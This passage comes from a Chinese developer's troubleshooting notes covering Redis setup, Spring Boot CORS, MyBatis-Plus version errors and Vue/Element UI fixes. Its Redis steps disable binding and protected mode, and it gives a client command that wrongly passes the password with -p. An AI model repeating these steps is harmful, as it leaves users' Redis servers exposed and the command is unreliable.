/usr/local/redis/bin/redis-server  /usr/bin/redis-server</pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\"># 查看进程是否存在</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token function\">ps</span> <span class=\"token parameter variable\">-aux</span> <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> redis</pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token comment\"># 关闭</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>./bin/redis-cli <span class=\"token function\">shutdown</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># 关闭 2：进程法</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token function\">ps</span> <span class=\"token parameter variable\">-ef</span> <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> <span class=\"token parameter variable\">-i</span> redis</pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token function\">kill</span> <span class=\"token parameter variable\">-9</span> PID</pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\"># 改配置文件</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token function\">vim</span> /usr/local/redis/redis.conf</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>daemonize:yes</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>bind注释掉</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>protected-mode:no</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>requirepass 设置密码</pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token comment\"># 启动客户端</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>./bin/redis-cli <span class=\"token parameter variable\">-p</span> password</pre></td></tr></table></figure><h1 id=\"附录\"><a class=\"anchor\" href=\"#附录\">#</a> 附录</h1>\n<h2 id=\"altenter\"><a class=\"anchor\" href=\"#altenter\">#</a> Alt+Enter</h2>\n<p>智能快捷键，自动实现类，补全方法调用</p>\n<h2 id=\"ctrlp\"><a class=\"anchor\" href=\"#ctrlp\">#</a> Ctrl+P</h2>\n<p>提示参数</p>\n<h2 id=\"1cmd查看目录下所有文件\"><a class=\"anchor\" href=\"#1cmd查看目录下所有文件\">#</a> 1.cmd 查看目录下所有文件</h2>\n<ol>\n<li>\n<p><code>dir /b</code>  可以查看当前路径下的所有文件和文件夹。</p>\n</li>\n<li>\n<p><code>dir /b /s</code>  可以查看当前路径下的所有文件和文件夹以及子目录下的文件。</p>\n</li>\n</ol>\n<h2 id=\"2npm换源\"><a class=\"anchor\" href=\"#2npm换源\">#</a> 2.npm 换源</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamI1MS5uZXQvYXJ0aWNsZS8yNzM5NzkuaHRt\">https://www.jb51.net/article/273979.htm</span></p>\n<ol>\n<li>\n<p>查看源</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">npm</span> config get registry</pre></td></tr></table></figure></li>\n<li>\n<p>更换源</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">npm</span> config <span class=\"token builtin class-name\">set</span> registry https://registry.npmmirror.com/</pre></td></tr></table></figure></li>\n</ol>\n<h2 id=\"3安装element框架提示版本不适应\"><a class=\"anchor\" href=\"#3安装element框架提示版本不适应\">#</a> 3. 安装 Element 框架提示版本不适应</h2>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240115235049452.png\" alt=\"image-20240115235049452\" /></p>\n<p>在 package-lock.json 中添加 node18 的版本依赖配置</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240115235200690.png\" alt=\"image-20240115235200690\" /></p>\n<p>更改后重新安装无误</p>\n<h2 id=\"4vue代码提示-idea插件\"><a class=\"anchor\" href=\"#4vue代码提示-idea插件\">#</a> 4.vue 代码提示 - IDEA 插件</h2>\n<p>下载 element 插件</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240116001959872.png\" alt=\"image-20240116001959872\" /></p>\n<h2 id=\"idea主题推荐\"><a class=\"anchor\" href=\"#idea主题推荐\">#</a> IDEA 主题推荐</h2>\n<p>One Dark theme</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wbHVnaW5zLmpldGJyYWlucy5jb20vcGx1Z2luLzExOTM4LW9uZS1kYXJrLXRoZW1lL3ZlcnNpb25zI3RhYnM=\">https://plugins.jetbrains.com/plugin/11938-one-dark-theme/versions#tabs</span></p>\n<h2 id=\"5导航栏易出现的问题\"><a class=\"anchor\" href=\"#5导航栏易出现的问题\">#</a> 5. 导航栏易出现的问题</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L29pbHBhc3RlbGwvYXJ0aWNsZS9kZXRhaWxzLzEwODA0OTkzNw==\">解决 Element-ui 中侧边栏最常出现的小问题_elementui 导航栏在小屏幕上会被折叠 - CSDN 博客</span></p>\n<ol>\n<li>\n<p>侧边导航栏收缩后，右侧内容不能一起收缩 <code>width=&quot;auto&quot;</code></p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/20200817100443864.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L29pbHBhc3RlbGw=,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\" /></p>\n<p>或者动态绑定变量改变宽度</p>\n</li>\n<li>\n<p>侧边导航栏不能往下平铺整个页面</p>\n<p>给导航栏最小高，单位用 vh<br />\n<img data-src=\"https://img-blog.csdnimg.cn/20200817102657975.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L29pbHBhc3RlbGw=,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\" /></p>\n<p>本人更改的方式 <code>min-height: calc(100vh)</code></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240116133035725.png\" alt=\"image-20240116133035725\" /></p>\n<p><strong>vh：相当于浏览器的高度</strong><br />\n<strong> vw：相当于浏览器的宽度</strong><br />\n<strong>例如：calc (100vh - 10px) 表示整个浏览器窗口高度减去 10px 的大小</strong></p>\n</li>\n</ol>\n<h2 id=\"6mapper-method-attempted-to-return-null-from-a-method-with-a-primitive-return-type-int试图从具有基元返回类型int的方法返回空值\"><a class=\"anchor\" href=\"#6mapper-method-attempted-to-return-null-from-a-method-with-a-primitive-return-type-int试图从具有基元返回类型int的方法返回空值\">#</a> 6.Mapper method attempted to return null from a method with a primitive return type (int). 试图从具有基元返回类型（int）的方法返回空值。</h2>\n<p>解决：</p>\n<p>将返回值<strong> boolean 封装数据类型为 Boolean</strong>、<strong>int 封装数据类型为 Integer</strong>。</p>\n<p>当 boolean、int、long 等数据类型作为返回值时，用 mybatis 查询的结果 null 时，会出现错误，查了查才发现这些基本数据类型是不能定义为 null 的。<br />\n也就是说当数据库查询结果为 null 时，不能直接使用 boolean、int、long 等基本数据类型作为返回值。</p>\n<h2 id=\"7invalid-bound-statement-not-found-comxoxbcspringbootmapperusermapperupdate\"><a class=\"anchor\" href=\"#7invalid-bound-statement-not-found-comxoxbcspringbootmapperusermapperupdate\">#</a> 7.Invalid bound statement (not found): com.xoxbc.springboot.mapper.UserMapper.update</h2>\n<p>springboot 不知道 User.xml 配置的内容</p>\n<p>解决：application.yml 中添加，扫描所有 mybatis 的 xml 文件</p>\n<pre><code>mybatis:\n  mapper-locations: classpath:mapper/*.xml\n</code></pre>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117103137188.png\" alt=\"image-20240117103137188\" /></p>\n<h2 id=\"8前后端跨域问题\"><a class=\"anchor\" href=\"#8前后端跨域问题\">#</a> 8. 前后端跨域问题</h2>\n<p>前端 8080 和后端 9090 端口不一致就会形成跨域</p>\n<p><strong>协议，ip，端口 三者有其一不同就是跨域，同时满足就是同源</strong></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117112215793.png\" alt=\"image-20240117112215793\" /></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hxbm9kZS9hcnRpY2xlL2RldGFpbHMvMTIwOTQ3NDYy\">https://blog.csdn.net/xqnode/article/details/120947462</span></p>\n<p>新建 config/CorsConfig.java  配置文件</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>context<span class=\"token punctuation\">.</span>annotation<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Bean</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>context<span class=\"token punctuation\">.</span>annotation<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Configuration</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>web<span class=\"token punctuation\">.</span>cors<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">CorsConfiguration</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>web<span class=\"token punctuation\">.</span>cors<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">UrlBasedCorsConfigurationSource</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>web<span class=\"token punctuation\">.</span>filter<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">CorsFilter</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token annotation punctuation\">@Configuration</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">CorsConfig</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token comment\">// 当前跨域请求最大有效时长。这里默认 1 天</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">final</span> <span class=\"token keyword\">long</span> <span class=\"token constant\">MAX_AGE</span> <span class=\"token operator\">=</span> <span class=\"token number\">24</span> <span class=\"token operator\">*</span> <span class=\"token number\">60</span> <span class=\"token operator\">*</span> <span class=\"token number\">60</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token annotation punctuation\">@Bean</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">CorsFilter</span> <span class=\"token function\">corsFilter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token class-name\">UrlBasedCorsConfigurationSource</span> source <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">UrlBasedCorsConfigurationSource</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token class-name\">CorsConfiguration</span> corsConfiguration <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">CorsConfiguration</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        corsConfiguration<span class=\"token punctuation\">.</span><span class=\"token function\">addAllowedOrigin</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"http://localhost:8080\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 1 设置访问源地址</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        corsConfiguration<span class=\"token punctuation\">.</span><span class=\"token function\">addAllowedHeader</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"*\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 2 设置访问源请求头</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        corsConfiguration<span class=\"token punctuation\">.</span><span class=\"token function\">addAllowedMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"*\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 3 设置访问源请求方法</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        corsConfiguration<span class=\"token punctuation\">.</span><span class=\"token function\">setMaxAge</span><span class=\"token punctuation\">(</span><span class=\"token constant\">MAX_AGE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        source<span class=\"token punctuation\">.</span><span class=\"token function\">registerCorsConfiguration</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/**\"</span><span class=\"token punctuation\">,</span> corsConfiguration<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 4 对接口配置跨域设置</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">CorsFilter</span><span class=\"token punctuation\">(</span>source<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"9dependency-combaomidoumybatis-plus-spring-boot3-starter351-not-found\"><a class=\"anchor\" href=\"#9dependency-combaomidoumybatis-plus-spring-boot3-starter351-not-found\">#</a> 9.Dependency 'com.baomidou:mybatis-plus-spring-boot3-starter:3.5.1' not found</h2>\n<p>mybatis-plus 依赖导不进去</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8yMzI5NzMy\">https://cloud.tencent.com/developer/article/2329732</span></p>\n<p>SpringBoot 3 ，使用了 mybatis-plus <strong>3.5.1</strong> 版本，运行报错</p>\n<p>原因：<strong>mybatis-plus 3.5.3 开始才支持 Spring Boot3！</strong></p>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">&lt;!--mybatis-plus--></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dependency</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>groupId</span><span class=\"token punctuation\">></span></span>com.baomidou<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>groupId</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>artifactId</span><span class=\"token punctuation\">></span></span>mybatis-plus-boot-starter<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>artifactId</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>version</span><span class=\"token punctuation\">></span></span>3.5.3<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>version</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dependency</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><h2 id=\"10bean-named-ddlapplicationrunner-is-expected-to-be-of-type-orgspringframeworkbootrunner-but-was-actually-of-type-orgspringframeworkbeansfactorysupportnullbean\"><a class=\"anchor\" href=\"#10bean-named-ddlapplicationrunner-is-expected-to-be-of-type-orgspringframeworkbootrunner-but-was-actually-of-type-orgspringframeworkbeansfactorysupportnullbean\">#</a> 10.Bean named 'ddlApplicationRunner' is expected to be of type 'org.springframework.boot.Runner' but was actually of type 'org.springframework.beans.factory.support.NullBean'</h2>\n<p>由于版本迭代造成的问题</p>\n<p>进过测试返现 springboot3 和<strong> mybatis-plus 3.5.5</strong> 版本可以整合，没有人任何问题。</p>\n<p>新版本的 mybatisplus 已经修正了问题。</p>\n<h2 id=\"11table-xh1xxhguser-doesnt-exist\"><a class=\"anchor\" href=\"#11table-xh1xxhguser-doesnt-exist\">#</a> 11.Table 'xh1xxhg.user' doesn't exist</h2>\n<p>数据库为 sys_user 名，与 mybatis-plus 框架内已经定义好的不同</p>\n<p>需要注解指定</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token annotation punctuation\">@TableName</span><span class=\"token punctuation\">(</span>value <span class=\"token operator\">=</span> <span class=\"token string\">\"sys_user\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token annotation punctuation\">@TableId</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">private</span> <span class=\"token class-name\">Integer</span> id<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117173016612.png\" alt=\"image-20240117173016612\" /></p>\n<h2 id=\"12ajax请求-304解决方案\"><a class=\"anchor\" href=\"#12ajax请求-304解决方案\">#</a> 12.ajax 请求 304 解决方案</h2>\n<p>请求一直是 304 Not Modified，但是能够正常返回数据库数据</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1d2VpMjAwMy9hcnRpY2xlL2RldGFpbHMvNzAxMzkwNjI=\">https://blog.csdn.net/huwei2003/article/details/70139062</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1MzkzODY5L2FydGljbGUvZGV0YWlscy84ODkwNzczNQ==\">https://blog.csdn.net/qq_35393869/article/details/88907735</span></p>\n<p>304 的标准解释是：Not Modified 客户端有缓冲的文档并发出了一个条件性的请求（一般是提供 If-Modified-Since 头表示客户只想比指定日期更新的文档）。服务器告诉客户，原来缓冲的文档还可以继续使用。<br />\n如果客户端在请求一个文件的时候，发现自己缓存的文件有 Last Modified ，那么在请求中会包含 If Modified Since ，这个时间就是缓存文件的 Last Modified 。因此，如果请求中包含 If Modified Since，就说明已经有缓存在客户端。只要判断这个时间和当前请求的文件的修改时间就可以确定是返回 304 还是 200 。对于静态文件，例如：CSS、图片，服务器会自动完成 Last Modified 和 If Modified Since 的比较，完成缓存或者更新。但是对于动态页面，就是动态产生的页面，往往没有包含 Last Modified 信息，这样浏览器、网关等都不会做缓存，也就是在每次请求的时候都完成一个 200 的请求。<br />\n因此，对于动态页面做缓存加速，首先要在 Response 的 HTTP Header 中增加 Last Modified 定义，其次根据 Request 中的 If Modified Since 和被请求内容的更新时间来返回 200 或者 304 。虽然在返回 304 的时候已经做了一次数据库查询，但是可以避免接下来更多的数据库查询，并且没有返回页面内容而只是一个 HTTP Header，从而大大的降低带宽的消耗，对于用户的感觉也是提高。</p>\n<p>当这些缓存有效的时候，通过 HttpWatch 查看一个请求会得到这样的结果：</p>\n<ul>\n<li>第一次访问 200</li>\n<li>鼠标点击二次访问 (Cache)</li>\n<li>按 F5 刷新 304</li>\n<li>按 Ctrl+F5 强制刷新 200</li>\n</ul>\n<p>如果是这样的就说明缓存真正有效了。以上就是我对 HTTP 304 的一个理解。</p>\n<h2 id=\"13mybatisplus生成的id过长\"><a class=\"anchor\" href=\"#13mybatisplus生成的id过长\">#</a> 13.MybatisPlus 生成的 id 过长</h2>\n<p><strong>原因</strong>：使用 MybatisPlus 的 id 生成策略产生的 id 数太大，超过了 JavaScript 能够解析的最大范围，这样会导致<strong>精度丢失</strong>，前台获取到的 id 和后台数据库中不一致，从而导致无法进行增删改操作。当 id 定义为 Long 类型后，生成的 id 是一个 19 位数，而 js 能够支持解析的范围是在 - 9007199254740992 到 + 9007199254740992 之间，最大值才 16 位数。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pxbTE5OTI0MDk2NzAvYXJ0aWNsZS9kZXRhaWxzLzEyNTkwMDI1MA==\">解决 MybatisPlus 生成的 id 过长_mybatisplus 自增 id 超大 - CSDN 博客</span></p>\n<ol>\n<li>id 注解 **@TableId (value = &quot;id&quot;, type = IdType.AUTO)**</li>\n<li>删库重建 (<strong>有效</strong>)</li>\n</ol>\n<h2 id=\"14编辑功能使用时scope未定义\"><a class=\"anchor\" href=\"#14编辑功能使用时scope未定义\">#</a> 14. 编辑功能使用时 scope 未定义</h2>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240118114908170.png\" alt=\"image-20240118114908170\" /></p>\n<p>scope 未定义</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240118114702564.png\" alt=\"image-20240118114702564\" /></p>\n<p>slot-scope 需要改为<strong> v-slot</strong></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240118114834425.png\" alt=\"image-20240118114834425\" /></p>\n<h2 id=\"15axios-delete-400错误\"><a class=\"anchor\" href=\"#15axios-delete-400错误\">#</a> 15.axios delete 400 错误</h2>\n<p>方法是 qs.stringfy 改为<strong>字符串拼接</strong>，或者<strong>调用 post 请求</strong></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240118151832194.png\" alt=\"image-20240118151832194\" /></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240118151903073.png\" alt=\"image-20240118151903073\" /></p>\n<h2 id=\"16mybatis-plus代码生成器fileoverride-is-deprecated\"><a class=\"anchor\" href=\"#16mybatis-plus代码生成器fileoverride-is-deprecated\">#</a> 16.mybatis-plus 代码生成器 fileOverride ()’ is deprecated</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzUyOTM5NC9hcnRpY2xlL2RldGFpbHMvMTMxMDQ4OTc2\">https://blog.csdn.net/weixin_43529394/article/details/131048976</span></p>\n<p>fileOverride()’ is deprecated<br />\n 方法一：在 strategyConfig 分别对四个包进行配置，注意，方法名变成了 enableFileOverride</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">.</span><span class=\"token function\">strategyConfig</span><span class=\"token punctuation\">(</span>builder <span class=\"token operator\">-></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    builder<span class=\"token punctuation\">.</span><span class=\"token function\">addInclude</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"user\"</span><span class=\"token punctuation\">)</span><span class=\"token comment\">// 设置需要生成的表名</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>           <span class=\"token punctuation\">.</span><span class=\"token function\">entityBuilder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">enableLombok</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">enableFileOverride</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>           <span class=\"token punctuation\">.</span><span class=\"token function\">controllerBuilder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">enableFileOverride</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>           <span class=\"token punctuation\">.</span><span class=\"token function\">mapperBuilder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">enableFileOverride</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>           <span class=\"token punctuation\">.</span><span class=\"token function\">serviceBuilder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">enableFileOverride</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>方法二：将 mybatis-plus-boot-starter 和 mybatis-plus-generator 的版本降到 3.5.1</p>\n<h2 id=\"17mybatis-plus代码生成器exception-in-thread-main-javalangnoclassdeffounderror-freemarkertemplateconfiguration\"><a class=\"anchor\" href=\"#17mybatis-plus代码生成器exception-in-thread-main-javalangnoclassdeffounderror-freemarkertemplateconfiguration\">#</a> 17.mybatis-plus 代码生成器 Exception in thread &quot;main&quot; java.lang.NoClassDefFoundError: freemarker/template/Configuration</h2>\n<p>报错</p>\n<pre><code>Exception in thread &quot;main&quot; java.lang.NoClassDefFoundError: freemarker/template/Configuration at com.baomidou.mybatisplus.generator.engine.FreemarkerTemplateEngine.init(FreemarkerTemplateEngine.java:41) at com.baomidou.mybatisplus.generator.engine.FreemarkerTemplateEngine.init(FreemarkerTemplateEngine.java:36) at com.baomidou.mybatisplus.generator.AutoGenerator.execute(AutoGenerator.java:179) at com.baomidou.mybatisplus.generator.FastAutoGenerator.execute(FastAutoGenerator.java:229) at com.xoxbc.springboot.utils.CodeGenerator.main(CodeGenerator.java:45)\n</code></pre>\n<p>导入需要的依赖即可解决</p>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">&lt;!--mybatis-plus--></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dependency</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>groupId</span><span class=\"token punctuation\">></span></span>com.baomidou<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>groupId</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>artifactId</span><span class=\"token punctuation\">></span></span>mybatis-plus-boot-starter<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>artifactId</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>version</span><span class=\"token punctuation\">></span></span>3.5.5<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>version</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dependency</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">&lt;!--mybatis-plus 代码生成器 --></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dependency</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td 